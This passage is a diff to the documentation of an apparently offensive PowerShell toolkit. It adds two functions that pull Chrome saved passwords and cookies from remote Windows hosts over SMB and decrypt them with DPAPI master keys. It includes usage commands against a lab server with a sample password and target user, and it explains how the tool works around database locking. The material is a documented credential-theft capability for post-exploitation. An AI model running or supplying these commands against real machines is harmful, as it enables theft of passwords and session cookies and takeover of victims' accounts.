@@ -550,6 +550,32 @@ Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -Path $blob.Pat
 Get-TBODpapiBlob -ServerName corp1-web01.corp1.lab.home-labs.lol -RegistryPath HKLM\Software\Contoso -ValueName Blob -MasterKey $mk.MasterKey
 ```
 
+#### Get-TBOChromeLogins
+
+Reads Chrome's Login Data SQLite database for user profiles over SMB and decrypts saved passwords.
+Modern Chrome (v10/v11) uses an AES state key stored in `Local State` (`os_crypt.encrypted_key`), which is DPAPI-protected with user scope.
+To avoid remote SQLite locking issues, TBO snapshots the database (and optional `-wal`/`-shm` sidecars when present) to a local temp directory before querying.
+
+```powershell
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+
+Get-TBOChromeLogins -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -ProfileName 'Profile 2' -MasterKeys $userKeys
+```
+
+#### Get-TBOChromeCookies
+
+Reads Chrome's Cookies SQLite database for user profiles over SMB and decrypts cookie values.
+Prefers `Network\\Cookies` (newer Chrome path) and falls back to legacy `Cookies` when needed.
+
+```powershell
+$userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
+Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -MasterKeys $userKeys
+
+Get-TBOChromeCookies -ServerName corp1-web01.corp1.lab.home-labs.lol -UserName 'jsmith' -MasterKeys $userKeys |
+  Select-Object HostKey, Name, Value, ExpiresUtc
+```
+
 #### Get-TBOCredManFiles
 
 Enumerates Credential Manager files (Credentials and Vaults) for user and system profiles.
